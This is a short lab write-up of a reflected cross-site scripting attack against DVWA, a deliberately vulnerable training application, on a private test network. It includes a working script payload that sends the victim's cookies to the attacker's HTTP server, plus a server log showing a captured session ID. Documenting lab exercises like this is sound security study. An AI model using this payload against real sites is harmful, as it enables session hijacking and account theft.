**File 1: `xss_reflected.md`**

````markdown
# XSS Reflected - DVWA

**Environment:**  
- Attacker: Kali Linux (192.168.20.11)  
- Victim: Debian (192.168.20.12)  
- DVWA Security Level: Low  

---

## Steps

1. On Kali, start a simple HTTP server on port 8000:
   ```bash
   python3 -m http.server 8000
````

2. On Debian (victim), enter the following payload in DVWA XSS (Reflected) module:

   ```html
   <script>new Image().src="http://192.168.20.11:8000/?cookie="+document.cookie;</script>
   ```
3. Submit the form.

---

## Result

On Kali, the HTTP server logs the captured cookie:

```
192.168.20.12 - - [16/Aug/2025 15:39:27] "GET /?cookie=security=low;%20PHPSESSID=hn4oqhg5fhsjiatac6k33n9trb HTTP/1.1" 304 -
```

**Observation:**

* The payload executes immediately when the victim interacts with the malicious input.
* Cookies and session tokens can be captured by the attacker.
* Reflected XSS requires victim interaction (clicking a link or submitting a form).

